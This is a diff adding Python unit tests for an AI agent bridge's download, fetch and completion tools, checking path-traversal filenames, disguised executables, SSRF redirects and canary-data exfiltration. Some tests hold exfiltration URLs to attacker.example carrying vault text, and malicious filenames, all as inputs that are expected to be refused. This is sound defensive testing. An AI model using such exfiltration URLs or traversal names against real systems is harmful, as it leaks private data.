@@ -435,8 +435,44 @@ class AgentBridgeFilesTest(unittest.TestCase):
             with self.assertRaises(ValueError):
                 self.call('write_note', title=title, content=content)
 
+    def test_download_stages_valid_data_records_hash_and_refuses_overwrite(self):
+        self.authorize_links('https://example.com/track.mp3')
+        with self.transfer():
+            result = self.call('download', url='https://example.com/track.mp3', filename='track.mp3')
+            with self.assertRaises(FileExistsError):
+                self.call('download', url='https://example.com/track.mp3', filename='track.mp3')
+        stored = self.job_folder / 'downloads' / result['staging_path']
+        self.assertEqual(result['sha256'], hashlib.sha256(stored.read_bytes()).hexdigest())
+        registered = json.loads((self.job_folder / 'download-manifests/track.mp3.json').read_text(encoding='utf-8'))
+        self.assertEqual(registered, result)
 
+    def test_download_refuses_executables_names_and_disguised_binary(self):
+        self.authorize_links('https://example.com/a')
+        with patch.object(yakala, '_agent_public_get') as fetch:
+            for name in ('x.exe', 'x.py', '../x.mp3', 'NUL.txt', 'x.mp3:evil', 'x.mp3.cmd'):
+                with self.assertRaises(ValueError):
+                    self.call('download', url='https://example.com/a', filename=name)
+            fetch.assert_not_called()
+        with self.transfer(b'MZ malicious executable'):
+            with self.assertRaises(ValueError):
+                self.call('download', url='https://example.com/a', filename='song.mp3')
+        self.assertFalse((self.job_folder / 'downloads/song.mp3').exists())
 
+    def test_complete_records_owned_outputs_and_is_idempotent(self):
+        self.authorize_links('https://example.com/a.mp3')
+        note = self.call('write_note', title='Result', content='Verified result')
+        with self.transfer():
+            download = self.call('download', url='https://example.com/a.mp3', filename='song.mp3')
+        arguments = {'status': 'completed', 'summary': 'Saved the file.', 'notes': [note['path']], 'downloads': [download]}
+        self.assertEqual(self.call('complete', **arguments), self.call('complete', **arguments))
+        manifest = json.loads((self.job_folder / 'result.json').read_text(encoding='utf-8'))
+        self.assertEqual(manifest['job_id'], self.job['id'])
+        self.assertEqual(manifest['notes'], [note['path']])
+        self.assertEqual(manifest['downloads'], [download])
+        with self.assertRaises(ValueError):
+            self.call('complete', status='failed', summary='Changed my mind')
+        with self.assertRaises(ValueError):
+            self.call('write_note', title='Late mutation', content='no')
 
     def test_complete_auto_notes_remain_idempotent_after_worker_writes_its_host_result(self):
         note = self.call('write_note', title='Result', content='Agent-produced result.')
@@ -450,6 +486,17 @@ class AgentBridgeFilesTest(unittest.TestCase):
         manifest = json.loads((self.job_folder / 'result.json').read_text(encoding='utf-8'))
         self.assertEqual(manifest['notes'], [note['path']])
 
+    def test_complete_refuses_foreign_note_and_forged_download(self):
+        self.authorize_links('https://example.com/a.mp3')
+        self.note('knowledge/existing.md')
+        with self.assertRaises(ValueError):
+            self.call('complete', status='completed', summary='result', notes=['knowledge/existing.md'])
+        with self.transfer():
+            download = self.call('download', url='https://example.com/a.mp3', filename='song.mp3')
+        for bad in ({**download, 'sha256': '0' * 64}, {**download, 'staging_path': '../song.mp3'}):
+            with self.assertRaises(ValueError):
+                self.call('complete', status='completed', summary='result', downloads=[bad])
+        self.assertFalse((self.job_folder / 'result.json').exists())
 
     def test_yaml_privacy_syntax_cannot_be_downgraded_to_an_unknown_plain_scalar(self):
         canary = 'privacy-syntax-canary'
@@ -556,8 +603,48 @@ class AgentBridgeFilesTest(unittest.TestCase):
         with self.assertRaises(ValueError):
             self.call('read_note', path=alias + '/ordinary.md')
 
+    def test_arbitrary_public_url_cannot_transmit_vault_text(self):
+        self.note('knowledge/ordinary.md', 'VAULT_CANARY_7291')
+        canary = self.call('read_note', path='knowledge/ordinary.md')['text']
+        malicious = (
+            'https://attacker.example/collect?text=' + canary,
+            'https://' + canary.lower() + '.attacker.example/',
+            self.job['url'] + '?text=' + canary,
+            self.job['url'] + '/' + canary,
+        )
+        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
+            for url in malicious:
+                for tool, extra in (('fetch_source', {}), ('download', {'filename': 'payload.txt'})):
+                    with self.subTest(url=url, tool=tool), self.assertRaises(ValueError):
+                        self.call(tool, url=url, **extra)
+            fetched.assert_not_called()
 
+    def test_exact_source_links_can_be_downloaded_but_modifying_them_is_denied(self):
+        url = 'https://cdn.example.com/track.mp3?version=1'
+        source = self.authorize_links(url)
+        self.assertIn(url, source['links'])
+        with self.transfer():
+            result = self.call('download', url=url, filename='permitted.mp3')
+        self.assertEqual(result['source_url'], url)
+        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
+            for changed in (url + '&private=CANARY', url.replace('version=1', 'version=2'),
+                            url.replace('cdn.example.com', 'attacker.example')):
+                with self.subTest(url=changed), self.assertRaises(ValueError):
+                    self.call('fetch_source', url=changed)
+            fetched.assert_not_called()
 
+    def test_successful_complete_revokes_reads_search_and_fetch_immediately(self):
+        self.note('knowledge/ordinary.md', 'ordinary')
+        result = {'status': 'completed', 'summary': 'Done.'}
+        self.call('complete', **result)
+        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
+            for tool, args in (('read_note', {'path': 'knowledge/ordinary.md'}),
+                               ('search_notes', {'query': 'ordinary'}),
+                               ('fetch_source', {'url': self.job['url']})):
+                with self.subTest(tool=tool), self.assertRaises(ValueError):
+                    self.call(tool, **args)
+            fetched.assert_not_called()
+        self.assertTrue(self.call('complete', **result)['accepted'])
 
     def test_complete_acknowledges_submission_without_claiming_worker_success(self):
         result = self.call('complete', status='completed', summary='Model considers its work done.')
@@ -611,7 +698,7 @@ class AgentBridgeFilesTest(unittest.TestCase):
         self.assertEqual(len(rows), 3)
         self.assertEqual(rows[0]['result']['protocolVersion'], '2025-06-18')
         names = [tool['name'] for tool in rows[1]['result']['tools']]
-        self.assertEqual(names, ['read_note', 'search_notes', 'write_note', 'complete'])
+        self.assertEqual(names, ['read_note', 'search_notes', 'fetch_source', 'download', 'write_note', 'complete'])
         self.assertEqual(rows[2]['result'], {})
 
     def test_protocol_refuses_uninitialized_unknown_method_and_bad_tool(self):
@@ -641,6 +728,118 @@ class AgentBridgeFilesTest(unittest.TestCase):
             self.assertEqual(yakala._agent_mcp_main(self.vault, self.state, self.job['id']), 1)
         call.assert_not_called()
         self.assertEqual(json.loads(outgoing.getvalue())['error']['code'], -32700)
+
+
+class FakeAgentResponse:
+    def __init__(self, body=b'hello', status=200, headers=None):
+        self.body, self.status, self.headers, self.closed = io.BytesIO(body), status, headers or {}, False
+
+    def getheader(self, name, default=None):
+        return self.headers.get(name, default)
+
+    def read1(self, limit):
+        return self.body.read(limit)
+
+    def close(self):
+        self.closed = True
+
+
+class AgentBridgeNetworkTest(unittest.TestCase):
+    def run_get(self, responses, url='https://example.com/page', answers=None, **kwargs):
+        sockets, requests, tls_hosts = [], [], []
+
+        class FakeSocket:
+            def __init__(self, family, kind):
+                self.family, self.kind, self.endpoint, self.closed, self.timeouts = family, kind, None, False, []
+                sockets.append(self)
+
+            def settimeout(self, value):
+                self.timeouts.append(value)
+
+            def connect(self, endpoint):
+                self.endpoint = endpoint
+
+            def close(self):
+                self.closed = True
+
+        class FakeHTTP:
+            def __init__(self, host, port, timeout):
+                self.host, self.port, self.timeout, self.sock = host, port, timeout, None
+
+            def request(self, method, path, headers):
+                self.connect()
+                requests.append({'method': method, 'path': path, 'headers': headers, 'host': self.host})
+
+            def getresponse(self):
+                return responses.pop(0)
+
+            def close(self):
+                if self.sock:
+                    self.sock.close()
+
+        def tls_wrap(channel, server_hostname):
+            tls_hosts.append(server_hostname)
+            return channel
+
+        with patch('http.client.HTTPConnection', FakeHTTP), patch('socket.socket', FakeSocket), \
+                patch('socket.getaddrinfo', return_value=answers or [(socket.AF_INET, socket.SOCK_STREAM, 6, '', ('93.184.216.34', 443))]), \
+                patch('ssl.create_default_context', return_value=types.SimpleNamespace(wrap_socket=tls_wrap)):
+            result = yakala._agent_public_get(url, **kwargs)
+        return result, sockets, requests, tls_hosts
+
+    def test_socket_is_pinned_and_tls_still_checks_hostname(self):
+        response = FakeAgentResponse(headers={'Content-Type': 'text/plain'})
+        result, sockets, requests, tls = self.run_get([response])
+        self.assertEqual(result['body'], b'hello')
+        self.assertEqual(sockets[0].endpoint, ('93.184.216.34', 443))
+        self.assertEqual(tls, ['example.com'])
+        self.assertEqual(requests[0]['method'], 'GET')
+        self.assertNotIn('Authorization', requests[0]['headers'])
+        self.assertNotIn('Cookie', requests[0]['headers'])
+        self.assertTrue(sockets[0].closed)
+        self.assertTrue(response.closed)
+
+    def test_mixed_private_dns_answer_never_connects(self):
+        answers = [(socket.AF_INET, socket.SOCK_STREAM, 6, '', ('93.184.216.34', 443)),
+                   (socket.AF_INET, socket.SOCK_STREAM, 6, '', ('127.0.0.1', 443))]
+        with patch('socket.getaddrinfo', return_value=answers), patch('socket.socket') as channel:
+            with self.assertRaises(ValueError):
+                yakala._agent_public_get('https://example.com/x')
+        channel.assert_not_called()
+
+    def test_private_redirect_and_https_downgrade_are_refused(self):
+        for target in ('https://127.0.0.1/private', 'http://example.com/insecure'):
+            response = FakeAgentResponse(status=302, headers={'Location': target})
+            with self.assertRaises(ValueError):
+                self.run_get([response])
+            self.assertTrue(response.closed)
+
+    def test_each_public_redirect_uses_fresh_validated_dns(self):
+        first = FakeAgentResponse(status=302, headers={'Location': 'https://cdn.example.com/song'})
+        final = FakeAgentResponse(body=b'final')
+        result, sockets, requests, tls = self.run_get([first, final])
+        self.assertEqual(result['url'], 'https://cdn.example.com/song')
+        self.assertEqual(tls, ['example.com', 'cdn.example.com'])
+        self.assertEqual(len(sockets), 2)
+        self.assertTrue(all(item.closed for item in sockets))
+
+    def test_oversized_and_compressed_response_are_refused(self):
+        for response in (FakeAgentResponse(body=b'123456'),
+                         FakeAgentResponse(headers={'Content-Length': '100'}),
+                         FakeAgentResponse(headers={'Content-Encoding': 'gzip'})):
+            with self.assertRaises(ValueError):
+                self.run_get([response], byte_limit=5)
+            self.assertTrue(response.closed)
+
+    def test_fetch_extracts_exact_links_and_discards_script_source(self):
+        html = b'<html><title>A song</title><script>delete everything</script><p>Music by A.</p><a href="/song.mp3">Download</a></html>'
+        with patch.object(yakala, '_agent_public_get', return_value={'url': 'https://example.com/page', 'body': html,
+                                                                  'content_type': 'text/html; charset=utf-8'}):
+            result = yakala._agent_fetch_source('https://example.com/page')
+        self.assertEqual(result['title'], 'A song')
+        self.assertNotIn('delete everything', result['text'])
+        self.assertEqual(result['links'], ['https://example.com/song.mp3'])
+        self.assertEqual(result['source_trust'], 'untrusted')
 
 
 class AgentManualProcessRaceTest(unittest.TestCase):
